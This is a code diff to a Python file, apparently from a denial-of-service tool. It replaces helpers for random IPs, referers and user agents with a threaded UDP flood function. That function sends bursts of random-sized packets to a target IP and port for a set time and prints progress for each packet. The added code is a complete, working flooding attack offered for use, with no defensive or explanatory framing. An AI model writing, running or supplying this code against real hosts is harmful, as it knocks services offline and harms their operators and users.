@@ -22,24 +22,52 @@
 # OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 # SOFTWARE.
 
-import json
 import random
+import time
+import socket
+from threading import Thread
 
-# Get random IP
-def random_IP():
-    ip = []
-    for _ in range(0, 4):
-        ip.append(str(random.randint(1,255)))
-    return ".".join(ip)
+def UDP_ATTACK(threads, attack_time, target):
+	# Finish
+	global FINISH
+	FINISH = False
+	target_ip = target.split(":")[0]
+	target_port = int(target.split(":")[1])
 
-# Get random referer
-def random_referer():
-    with open("tools/other/referers.txt", 'r') as referers:
-    	referers = referers.readlines()
-    return random.choice(referers)
+	print("\033[1;34m"+"[*]"+"\033[0m"+" Starting UDP attack...")
+	
 
-# Get random user agent
-def random_useragent():
-    with open("tools/other/user_agents.json", 'r') as agents:
-        user_agents = json.load(agents)["agents"]
-    return random.choice(user_agents)
+	threads_list = []
+
+	# UDP flood
+	def udp_flood():
+		global FINISH
+		# Create socket
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		while True:
+			if FINISH:
+				break
+			# Send random payload
+			try:
+				for _ in range(16):
+					payload = random._urandom(random.randint(1, 60))
+					sock.sendto(payload, (target_ip, target_port))
+			except Exception as e:
+				print(e)
+			else:
+				print("\033[1;32m"+"[+]"+"\033[0m"+" UDP packet with size " + str(len(payload)) + " was sent!")
+
+	# Start threads
+	for thread in range(threads):
+		print("\033[1;34m"+"[*]"+"\033[0m"+" Staring thread " + str(thread)+ "...")
+		t = Thread(target = udp_flood)
+		t.start()
+		threads_list.append(t)
+	# Sleep selected secounds
+	time.sleep(attack_time)
+	# Terminate threads
+	for thread in threads_list:
+		FINISH = True
+		thread.join()
+	
+	print("\033[1;33m"+"[!]"+"\033[0m"+" Attack completed.")
